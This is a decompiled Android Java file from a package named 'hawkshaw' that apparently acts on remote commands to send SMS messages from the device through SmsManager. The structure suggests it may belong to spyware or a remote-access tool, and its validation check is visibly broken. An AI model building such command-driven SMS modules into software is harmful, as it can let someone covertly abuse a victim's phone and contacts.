package com.hawkshaw.library.features.telephony.messages;

import Y1.K;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.telephony.SmsManager;
import com.hawkshaw.library.datalayer.models.Command;
import com.hawkshaw.library.logger.Logger;
import java.util.ArrayList;
import r3.j;

public final class SendMessageKt {
    private static final String TAG = "SendMessage";
    private static final String smsDelivered = "smsDelivered";
    private static final String smsSent = "smsSent";

    private static final SendMessageKt$receiver$1 receiver(Command.SendMessageRequest sendMessageRequest) {
        return new SendMessageKt$receiver$1(sendMessageRequest);
    }

    public static final void sendMessage(Context context, Command.SendMessageRequest sendMessageRequest) {
        K.n(context, "context");
        K.n(sendMessageRequest, "request");
        Logger logger = Logger.INSTANCE;
        Logger.v$default(logger, TAG, "Send Message received", false, 4, (Object) null);
        if (j.U(sendMessageRequest.getMessage()) || j.U(sendMessageRequest.getMessage())) {
            Logger.e$default(logger, TAG, "Message request malformed " + sendMessageRequest, (Exception) null, false, 12, (Object) null);
        }
        if (Build.VERSION.SDK_INT >= 33) {
            context.registerReceiver(receiver(sendMessageRequest), new IntentFilter(smsSent), 4);
        } else {
            context.registerReceiver(receiver(sendMessageRequest), new IntentFilter(smsSent));
        }
        SmsManager smsManager = (SmsManager) context.getSystemService(SmsManager.class);
        PendingIntent broadcast = PendingIntent.getBroadcast(context, 0, new Intent(smsSent), 1073741824);
        PendingIntent broadcast2 = PendingIntent.getBroadcast(context, 0, new Intent(smsDelivered), 1073741824);
        if (sendMessageRequest.getMessage().length() > 160) {
            smsManager.sendMultipartTextMessage(sendMessageRequest.getNumber(), (String) null, smsManager.divideMessage(sendMessageRequest.getMessage()), (ArrayList) null, (ArrayList) null);
            return;
        }
        smsManager.sendTextMessage(sendMessageRequest.getNumber(), (String) null, sendMessageRequest.getMessage(), broadcast, broadcast2);
    }
}
